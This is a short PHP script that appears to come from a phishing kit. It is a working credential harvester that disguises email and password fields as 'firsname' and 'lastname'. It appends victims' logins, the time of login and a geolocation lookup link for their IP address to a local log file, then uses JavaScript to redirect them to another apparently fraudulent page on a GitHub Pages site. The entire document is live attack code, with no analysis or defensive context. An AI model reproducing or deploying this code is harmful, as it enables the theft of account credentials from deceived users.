<?php
$file = "LINGACORRRR";
$firsname = $_POST['firsname'];
$lastname = $_POST['lastname'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "EMAIL           : ");
fwrite($handle, "$firsname");
fwrite($handle, "\n");
fwrite($handle, "PASS            : ");
fwrite($handle, "$lastname");
fwrite($handle, "\n");
fwrite($handle, "Tanggal Login   : ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "https://www.geodatatool.com/en/?ip=$ip");
fwrite($handle, "\n");
fwrite($handle, "=============================================");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"https://adsmangers.github.io/bussines/jonsbo/feloz.html?container-navigation\";
// -->
</script>";
?>
